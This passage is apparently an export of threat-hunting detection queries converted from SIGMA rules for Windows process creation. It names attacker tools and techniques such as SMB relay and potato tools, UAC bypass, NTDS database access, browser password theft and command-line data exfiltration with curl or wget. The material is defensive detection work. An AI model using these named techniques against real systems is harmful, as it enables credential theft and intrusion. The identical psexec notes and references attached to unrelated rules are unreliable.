            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1134"
            ],
            "name": "PUA - AdvancedRun Suspicious Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"/EXEFilename\" or tgt.process.cmdline contains \"/CommandLine\") and ((tgt.process.cmdline contains \" /RunAs 8 \" or tgt.process.cmdline contains \" /RunAs 4 \" or tgt.process.cmdline contains \" /RunAs 10 \" or tgt.process.cmdline contains \" /RunAs 11 \") or (tgt.process.cmdline contains \"/RunAs 8\" or tgt.process.cmdline contains \"/RunAs 4\" or tgt.process.cmdline contains \"/RunAs 10\" or tgt.process.cmdline contains \"/RunAs 11\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 578
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\ntdsutil.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 579
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Obfuscated IEX Invocation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline matches \"\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[\" or tgt.process.cmdline matches \"\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[\" or tgt.process.cmdline matches \"\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[\" or tgt.process.cmdline matches \"\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}\" or tgt.process.cmdline matches \"\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name\" or tgt.process.cmdline matches \"\\\\$VerbosePreference\\\\.ToString\\\\(\" or tgt.process.cmdline matches \"\\\\[String\\\\]\\\\s*\\\\$VerbosePreference\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 580
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a command line process that uses explorer.exe to launch arbitrary commands or binaries,\nwhich is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer spawning from \"svchost\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Explorer Process Tree Break",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"/factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b}\" or ((tgt.process.cmdline contains \"explorer.exe\") and (tgt.process.cmdline contains \" -root,\" or tgt.process.cmdline contains \" /root,\" or tgt.process.cmdline contains \" \u2013root,\" or tgt.process.cmdline contains \" \u2014root,\" or tgt.process.cmdline contains \" \u2015root,\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 581
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects SILENTTRINITY stager use via PE metadata",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "HackTool - SILENTTRINITY Stager Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.displayName contains \"st2stager\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 582
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Attackers can use print.exe for remote file copy",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Abusing Print Executable",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\print.exe\" and tgt.process.cmdline contains \"print\" and (tgt.process.cmdline contains \"/D\" and tgt.process.cmdline contains \".exe\")) and (not tgt.process.cmdline contains \"print.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 583
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Plink tunnel port forwarding to a local port",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572",
                "t1021"
            ],
            "name": "Suspicious Plink Port Forwarding",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"Command-line SSH, Telnet, and Rlogin client\" and tgt.process.cmdline contains \" -R \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 584
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021",
                "t1570",
                "t1569"
            ],
            "name": "Rundll32 Execution Without Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline in (\"rundll32.exe\",\"rundll32\"))) | columns ComputerName,SubjectUserName,tgt.process.cmdline,tgt.process.image.path,src.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 585
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Wab/Wabmig Unusual Parent Or Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WmiPrvSE.exe\" or src.process.image.path contains \"\\svchost.exe\" or src.process.image.path contains \"\\dllhost.exe\") and (tgt.process.image.path contains \"\\wab.exe\" or tgt.process.image.path contains \"\\wabmig.exe\")) or (src.process.image.path contains \"\\wab.exe\" or src.process.image.path contains \"\\wabmig.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 586
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1555"
            ],
            "name": "PUA - WebBrowserPassView Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"Web Browser Password Viewer\" or tgt.process.image.path contains \"\\WebBrowserPassView.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 587
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects different hacktools used for relay attacks on Windows for privilege escalation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1557"
            ],
            "name": "Potential SMB Relay Attack Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"PetitPotam\" or tgt.process.image.path contains \"RottenPotato\" or tgt.process.image.path contains \"HotPotato\" or tgt.process.image.path contains \"JuicyPotato\" or tgt.process.image.path contains \"\\just_dce_\" or tgt.process.image.path contains \"Juicy Potato\" or tgt.process.image.path contains \"\\temp\\rot.exe\" or tgt.process.image.path contains \"\\Potato.exe\" or tgt.process.image.path contains \"\\SpoolSample.exe\" or tgt.process.image.path contains \"\\Responder.exe\" or tgt.process.image.path contains \"\\smbrelayx\" or tgt.process.image.path contains \"\\ntlmrelayx\" or tgt.process.image.path contains \"\\LocalPotato\") or (tgt.process.cmdline contains \"Invoke-Tater\" or tgt.process.cmdline contains \" smbrelay\" or tgt.process.cmdline contains \" ntlmrelay\" or tgt.process.cmdline contains \"cme smb \" or tgt.process.cmdline contains \" /ntlm:NTLMhash \" or tgt.process.cmdline contains \"Invoke-PetitPotam\" or tgt.process.cmdline=\"*.exe -t * -p *\") or (tgt.process.cmdline contains \".exe -c \\\"{\" and tgt.process.cmdline contains \"}\\\" -z\")) and (not (tgt.process.image.path contains \"HotPotatoes6\" or tgt.process.image.path contains \"HotPotatoes7\" or tgt.process.image.path contains \"HotPotatoes \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 588
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass via Windows Firewall Snap-In Hijack",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\mmc.exe\" and src.process.cmdline contains \"WF.msc\") and (not tgt.process.image.path contains \"\\WerFault.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 589
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of the Add-In deployment cache updating utility (AddInutil.exe) which could be a sign of potential abuse of the binary to proxy execution via a custom Addins.Store payload.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Of AddinUtil.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\addinutil.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\conhost.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\werfault.exe\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\werfault.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 590
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of various CLI utilities exfiltrating data via web requests",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential Data Exfiltration Activity Via CommandLine Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"curl \") and (tgt.process.cmdline contains \" -ur\" and tgt.process.cmdline contains \" -me\" and tgt.process.cmdline contains \" -b\" and tgt.process.cmdline contains \" POST \")) or ((tgt.process.image.path contains \"\\curl.exe\" and tgt.process.cmdline contains \"--ur\") and (tgt.process.cmdline contains \" -d \" or tgt.process.cmdline contains \" --data \")) or (tgt.process.image.path contains \"\\wget.exe\" and (tgt.process.cmdline contains \"--post-data\" or tgt.process.cmdline contains \"--post-file\"))) and ((tgt.process.cmdline contains \"Get-Content\" or tgt.process.cmdline contains \"GetBytes\" or tgt.process.cmdline contains \"hostname\" or tgt.process.cmdline contains \"ifconfig\" or tgt.process.cmdline contains \"ipconfig\" or tgt.process.cmdline contains \"net view\" or tgt.process.cmdline contains \"netstat\" or tgt.process.cmdline contains \"nltest\" or tgt.process.cmdline contains \"qprocess\" or tgt.process.cmdline contains \"sc query\" or tgt.process.cmdline contains \"systeminfo\" or tgt.process.cmdline contains \"tasklist\" or tgt.process.cmdline contains \"ToBase64String\" or tgt.process.cmdline contains \"whoami\") or (tgt.process.cmdline contains \"type \" and tgt.process.cmdline contains \" > \" and tgt.process.cmdline contains \" C:\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 591
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using register-cimprovider.exe to execute arbitrary dll file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "DLL Execution Via Register-cimprovider.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\register-cimprovider.exe\" and (tgt.process.cmdline contains \"-path\" and tgt.process.cmdline contains \"dll\"))) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 592
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of the \"Squirrel.exe\" binary to execute arbitrary processes. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Process Proxy Execution Via Squirrel.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\squirrel.exe\" or tgt.process.image.path contains \"\\update.exe\") and (tgt.process.cmdline contains \"--processStart\" or tgt.process.cmdline contains \"--processStartAndWait\" or tgt.process.cmdline contains \"--createShortcut\")) and (not ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Discord\\Update.exe\" and tgt.process.cmdline contains \" --processStart\" and tgt.process.cmdline contains \"Discord.exe\") or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\GitHubDesktop\\Update.exe\" and tgt.process.cmdline contains \"GitHubDesktop.exe\") and (tgt.process.cmdline contains \"--createShortcut\" or tgt.process.cmdline contains \"--processStartAndWait\")) or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Microsoft\\Teams\\Update.exe\" and tgt.process.cmdline contains \"Teams.exe\") and (tgt.process.cmdline contains \"--processStart\" or tgt.process.cmdline contains \"--createShortcut\")) or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\yammerdesktop\\Update.exe\" and tgt.process.cmdline contains \"Yammer.exe\") and (tgt.process.cmdline contains \"--processStart\" or tgt.process.cmdline contains \"--createShortcut\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
